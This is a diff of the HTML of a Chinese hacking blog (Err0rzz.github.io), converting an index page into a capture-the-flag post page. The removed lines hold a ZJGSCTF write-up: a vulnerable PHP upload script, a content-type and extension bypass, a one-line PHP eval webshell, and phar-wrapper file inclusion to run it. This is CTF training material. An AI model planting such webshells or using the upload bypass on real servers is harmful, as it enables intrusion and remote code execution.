@@ -3,17 +3,18 @@
 <head>
   <meta charset="utf-8">
   
-  <title>Err0r</title>
+  <title>xman个人排位赛(纪念第一个xss) | Err0r</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="萌新菜鸡">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Err0r">
-<meta property="og:url" content="http://Err0rzz.github.io/index.html">
+  <meta name="description" content="#Babyweb第一次做这种文件上传包含漏洞吧。 看到page之后,想到文件包含,先用”php://filter/read=convert.base64-encode/resource=”filter伪协议读一下源码.整理了一下几个重要的源码如下:123456789101112131415161718192021222324252627282930313233343536373839404142">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xman个人排位赛(纪念第一个xss)">
+<meta property="og:url" content="http://Err0rzz.github.io/2017/08/31/XMAN/index.html">
 <meta property="og:site_name" content="Err0r">
-<meta property="og:description" content="萌新菜鸡">
+<meta property="og:description" content="#Babyweb第一次做这种文件上传包含漏洞吧。 看到page之后,想到文件包含,先用”php://filter/read=convert.base64-encode/resource=”filter伪协议读一下源码.整理了一下几个重要的源码如下:123456789101112131415161718192021222324252627282930313233343536373839404142">
+<meta property="og:updated_time" content="2017-08-31T12:41:17.341Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Err0r">
-<meta name="twitter:description" content="萌新菜鸡">
+<meta name="twitter:title" content="xman个人排位赛(纪念第一个xss)">
+<meta name="twitter:description" content="#Babyweb第一次做这种文件上传包含漏洞吧。 看到page之后,想到文件包含,先用”php://filter/read=convert.base64-encode/resource=”filter伪协议读一下源码.整理了一下几个重要的源码如下:123456789101112131415161718192021222324252627282930313233343536373839404142">
   
     <link rel="alternative" href="/atom.xml" title="Err0r" type="application/atom+xml">
   
@@ -27,9 +28,6 @@
   <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
   <link rel="apple-touch-icon" href="/apple-touch-icon.png">
   
-    
-    
-  
   
       <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
   
@@ -41,8 +39,8 @@
           rootUrl: '/',
           fancybox: true,
           animate: true,
-          isHome: true,
-          isPost: false,
+          isHome: false,
+          isPost: true,
           isArchive: false,
           isTag: false,
           isCategory: false,
@@ -214,9 +212,7 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap">
-  
-    <article id="post-XMAN" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-XMAN" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
       <a href="/2017/08/31/XMAN/" class="article-date">
@@ -232,12 +228,19 @@
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/08/31/XMAN/">xman个人排位赛(纪念第一个xss)</a>
+    <h1 class="article-title" itemprop="name">
+      xman个人排位赛(纪念第一个xss)
     </h1>
   
 
       </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
       
     
     <div class="article-entry" itemprop="articleBody">
@@ -268,211 +271,190 @@
 
       
       
-    </div>
-    
-    <div class="article-info article-info-index">
+        <div class="page-reward">
+          <p><a href="javascript:void(0)" onclick="dashangToggle()" class="dashang">赏</a></p>
+          <div class="hide_box"></div>
+          <div class="shang_box">
+            <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()">×</a>
+            <div class="shang_tit">
+              <p>纯属好玩</p>
+            </div>
+            <div class="shang_payimg">
+              <img src="/img/alipayimg.jpg" alt="扫码支持" title="扫一扫" />
+            </div>
+              <div class="pay_explain">扫码打赏，你说多少就多少</div>
+            <div class="shang_payselect">
+              
+                <div class="pay_item checked" data-id="alipay">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/alipay.png" alt="支付宝" /></span>
+                </div>
+              
+              
+                <div class="pay_item" data-id="wechat">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/weixin.png" alt="微信" /></span>
+                </div>
+              
+            </div>
+            <div class="shang_info">
+              <p>打开<span id="shang_pay_txt">支付宝</span>扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+        </div>
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js"></script>
+        <script type="text/javascript">
+          $(".pay_item").click(function(){
+            $(this).addClass('checked').siblings('.pay_item').removeClass('checked');
+            var dataid=$(this).attr('data-id');
+            $(".shang_payimg img").attr("src","/img/"+dataid+"img.jpg");
+            $("#shang_pay_txt").text(dataid=="alipay"?"支付宝":"微信");
+          });
+          function dashangToggle(){
+            
+            $(".hide_box").fadeToggle();
+            $(".shang_box").fadeToggle();
+          }
+        </script>
       
-      
-
-      
-      
-      <div class="clearfix"></div>
     </div>
     
   </div>
   
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-ZJGSCTF" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2017/08/31/ZJGSCTF/" class="article-date">
-      <time datetime="2017-08-31T10:50:00.000Z" itemprop="datePublished">2017-08-31</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
     
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/08/31/ZJGSCTF/">ZJGSCTF</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <a id="more"></a>
-<h1 id="ZJGSCTF-部分writeup"><a href="#ZJGSCTF-部分writeup" class="headerlink" title="ZJGSCTF 部分writeup"></a>ZJGSCTF 部分writeup</h1><p>##哇 黑进服务器<br>题目链接：<a href="http://218.76.35.74:20129" target="_blank" rel="external">http://218.76.35.74:20129</a></p>
-<p>进去之后老规矩先右键看源码，提示说，去到include.php之后提示说需要file，应该是文件包含，用filter协议”php://filter/read=convert.base64-encode/resource=”读取upload.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">****upload.php</div><div class="line">&lt;form action=&quot;&quot; enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; </div><div class="line">name=&quot;upload&quot;&gt;file:&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;br&gt; </div><div class="line">&lt;input type=&quot;submit&quot; value=&quot;upload&quot; /&gt;&lt;/form&gt;</div><div class="line"></div><div class="line">&lt;?php</div><div class="line">if(!empty($_FILES[&quot;file&quot;]))</div><div class="line">&#123;</div><div class="line">    echo $_FILES[&quot;file&quot;];</div><div class="line">    $allowedExts = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;);</div><div class="line">    @$temp = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);</div><div class="line">    $extension = end($temp);</div><div class="line">    if (((@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;) || (@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)</div><div class="line">    || (@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpg&quot;) || (@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;)</div><div class="line">    || (@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/x-png&quot;) || (@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;))</div><div class="line">    &amp;&amp; (@$_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 102400) &amp;&amp; in_array($extension, $allowedExts))</div><div class="line">    &#123;</div><div class="line">        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);</div><div class="line">        echo &quot;file upload successful!Save in:  &quot; . &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">        echo &quot;upload failed!&quot;;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
-<p>绕过方式很简单，只要后缀是<strong><em>jpg</em></strong>，且content-type是<strong>image/jpeg</strong>即可。</p>
-<ul>
-<li><p>一句话木马如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">***a.php</div><div class="line">&lt;?php eval($_POST(&apos;aaa&apos;))?&gt;</div></pre></td></tr></table></figure>
-</li>
-<li><p>将php打包成zip,然后重命名成jpg,上传</p>
-</li>
-<li>在include.php页面利用文件包含和phar伪协议来读取jpg中的php文件。如下：<img src="http://i.imgur.com/5EXKQSk.png" alt=""><em>这里一开始没加system，一直不成功</em>。</li>
-<li>然后flag文件藏在哪儿反正我没找到，潘大佬告诉我用find / -name ‘*flag*‘ 这才找到了flag</li>
-</ul>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-blind-SQL-injection-script" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2017/08/25/blind-SQL-injection-script/" class="article-date">
-      <time datetime="2017-08-25T11:22:58.000Z" itemprop="datePublished">2017-08-25</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/08/25/blind-SQL-injection-script/">blind_SQL_injection script</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <p>就是突然觉得收集一些脚本，而不是把丢掉会让自己做题效率高很，所以把作过的题目的脚本都收集起来吧。<br>
-          
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-        <p class="article-more-link">
-          <a  href="/2017/08/25/blind-SQL-injection-script/#more">大航海 >></a>
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2017/08/31/XMAN/">xman个人排位赛(纪念第一个xss)</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 Err0r 的个人博客">Err0r</a></p>
+        <p><span>发布时间:</span>2017年08月31日 - 18时58分</p>
+        <p><span>最后更新:</span>2017年08月31日 - 20时41分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/08/31/XMAN/" title="xman个人排位赛(纪念第一个xss)">http://Err0rzz.github.io/2017/08/31/XMAN/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://Err0rzz.github.io/2017/08/31/XMAN/　　作者: Err0r" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
-      
-      <div class="clearfix"></div>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
     </div>
-    
-  </div>
+
+
+
+<nav id="article-nav">
+  
+  
+    <a href="/2017/08/31/ZJGSCTF/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">ZJGSCTF</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
   
 </article>
 
-
-
-
-
-
-
-
-
-  
-    <article id="post-test" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2017/08/16/test/" class="article-date">
-      <time datetime="2017-08-16T10:57:24.000Z" itemprop="datePublished">2017-08-16</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
     
-      <input type="hidden" class="isFancy" />
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
     
+        <div id="gitments"></div>
+<script src="/js/gitment.browser.js"></script>
+<script>
+    var gitment = new Gitment({
+      id: window.location.pathname,
+      owner: 'Err0rzz',
+      repo: 'Err0rzz.github.io',
+      oauth: {
+        client_id: '',
+        client_secret: '',
+      },
+    })
+    gitment.render('gitments')
+</script>
     
-      <header class="article-header">
+
+
+
+    <div class="scroll" id="post-nav-button">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/08/16/test/">测试篇</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
-      
-      
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2017/08/31/ZJGSCTF/" title="下一篇: ZJGSCTF">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
     </div>
-    
-    <div class="article-info article-info-index">
-      
-      
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/XMAN/">xman个人排位赛(纪念第一个xss)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/ZJGSCTF/">ZJGSCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/25/blind-SQL-injection-script/">blind_SQL_injection script</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/16/test/">测试篇</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
 
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
 
 
-
-
-
-
-
-
-
-  
-  
+    <script>
+        
+    </script>
 </div>
       <footer id="footer">
     <div class="outer">
